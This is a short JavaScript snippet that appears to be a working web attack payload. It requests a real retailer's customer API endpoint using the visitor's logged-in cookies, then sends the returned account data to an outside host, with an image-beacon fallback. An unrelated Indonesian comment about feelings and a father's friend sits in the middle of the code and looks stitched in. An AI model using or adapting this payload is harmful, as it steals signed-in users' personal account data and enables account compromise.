(async () => {
  let data = '';
  try {
    const res = await fetch('https://store.nintendo.com/api/customer', {
      credentials: 'include'
    });
    data = await res.text();
  } catch (e) {
    data = 'ERR:' + e.message;
  }
// kalo cuma tentang perasaan tapi ga punya perusahaan, apa kata temen papa?
  const url = 'https://shiraishi.vercel.app/?d=' + encodeURIComponent(data);

  try {
    await fetch(url, { mode: 'no-cors' });
  } catch (e) {
    new Image().src = url;
  }
})();
